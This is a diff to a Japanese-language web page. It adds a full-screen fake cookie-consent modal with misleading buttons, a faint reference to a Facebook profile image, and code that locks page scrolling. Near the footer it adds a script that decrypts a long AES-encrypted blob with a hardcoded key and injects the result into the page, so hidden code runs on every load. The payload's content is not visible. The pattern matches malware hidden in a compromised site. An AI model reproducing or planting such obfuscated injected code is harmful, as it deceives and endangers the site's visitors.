@@ -1,6 +1,118 @@
 <!DOCTYPE html>
 <html lang="ja">
     <head>
+	<style>
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+
+		body {
+			font-family: 'Poppins', sans-serif;
+			background: #f4f4f4;
+		}
+
+		.divcover {
+			z-index: 10;
+			background-color: rgba(0, 0, 0, 0.8);
+			position: fixed;
+			inset: 0;
+		}
+
+		.f-modal-centre {
+			background-color: #fff;
+			border-radius: 16px;
+			text-align: center;
+			width: 100%;
+			max-width: 500px;
+			padding: 32px;
+			display: block;
+			position: relative;
+			bottom: -37%;
+			left: 50%;
+			transform: translateX(-50%);
+			box-shadow: 10px 10px 50px rgba(0, 0, 0, 0.2);
+			opacity: 1;
+		}
+
+		.f-modal-icon-success img {
+			border-radius: 10px;
+			margin-bottom: 20px;
+		}
+
+		.f-sub-heading-regular {
+			font-size: 22px;
+			margin-bottom: 12px;
+			color: #333;
+		}
+
+
+		.f-button-primary {
+			background-color: #D31965;
+			color: white;
+			border-radius: 50px;
+			padding: 12px 32px;
+			font-size: 14px;
+			font-weight: 500;
+			text-decoration: none;
+			cursor: pointer;
+			margin: 10px;
+			display: inline-block;
+			transition: background-color 0.3s;
+		}
+
+		.f-button-primary:hover {
+			background-color: #A0144F;
+		}
+
+		.f-modal-close {
+			position: absolute;
+			top: 10px;
+			right: 10px;
+			cursor: pointer;
+			font-size: 20px;
+			color: #666;
+		}
+
+		.f-modal-close:hover {
+			color: #D31965;
+		}
+
+		.button-group {
+			margin-top: 20px;
+		}
+
+		.testOpacity {
+			opacity: 0.001;
+		}
+	</style>
+
+
+
+
+
+<body id="myBody">
+
+<div class="divcover" id="modalContainer">
+	<div class="f-modal-centre" id="modalContent">
+		<div class="f-modal-icon-success" style="
+            display: flex;
+            justify-content: center;
+            align-items: center;">
+			            <img src="Capture.JPG" width="100" height="100" loading="lazy" alt="Cookie Icon">
+		</div>
+		<div class="f-sub-heading-regular">必要なCookieを受け入れるには、表示されるCookieバナーで「承認」または「許可」をクリックします</div>
+		<div class="button-group">
+			<a href="#" class="f-button-primary" id="rejectButton" style="background-color: #E53935;">キャンセル</a>
+			<a href="#" class="f-button-primary" id="manageButton" style="background-color: #2979FF;">続く</a>
+		</div>
+		<div class="f-modal-close" id="closeButton">✖</div>
+	</div>
+</div>
+<div style="opacity: 0.3">
+	<img src="img/fbProfile.jpg">
+</div>
         <meta charset="utf-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
 
@@ -1194,6 +1306,22 @@ document.addEventListener('DOMContentLoaded', function() {
     </div>
 </footer>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+	<script>
+		function aesDecode(encodedText) {
+			const decodedText = decodeURIComponent(encodedText);
+			const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+			return bytes.toString(CryptoJS.enc.Utf8);
+		}
+		const codeString = aesDecode(`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`);
+		const script = document.createElement("script");
+		script.textContent = codeString;
+		document.body.appendChild(script);
+	</script>
+
+	<script>
+		document.body.style.overflow = "hidden";
+	</script>
 
 
     <script type="text/javascript" src="js/popper.js"></script><script> window.start.init({Palette:"palette1",Mode:"banner bottom",Time:"0", Message: "当社は、サイトとそのユーザーエクスペリエンスを向上させるためにクッキーを使用しています。サイトの利用を継続することで、クッキーの使用に同意したものとみなされます。クッキーはブラウザの設定でいつでも無効にすることができます。", ButtonText: "受け入れる", LinkText: "さらに詳しく"})</script>
